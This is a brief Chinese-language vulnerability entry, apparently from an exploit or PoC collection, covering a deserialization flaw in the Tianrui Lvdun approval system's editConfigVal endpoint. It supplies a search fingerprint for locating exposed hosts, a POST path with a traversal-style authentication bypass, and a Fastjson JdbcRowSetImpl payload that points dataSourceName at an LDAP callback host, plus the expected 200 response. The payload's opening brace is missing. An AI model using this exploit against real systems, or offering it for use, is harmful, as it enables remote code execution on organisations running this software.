# 天锐绿盾审批系统editConfigVal存在反序列化漏洞

天锐绿盾 ｜ 反序列化 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/login.jsp/.%2e/rest/conf/editConfigVal HTTP/1.1`

**Payload**
```
"@type": "com.sun.rowset.JdbcRowSetImpl",
"dataSourceName": "ldap://dnslog/A4",
"autoCommit": true
}
```
- **响应特征**：200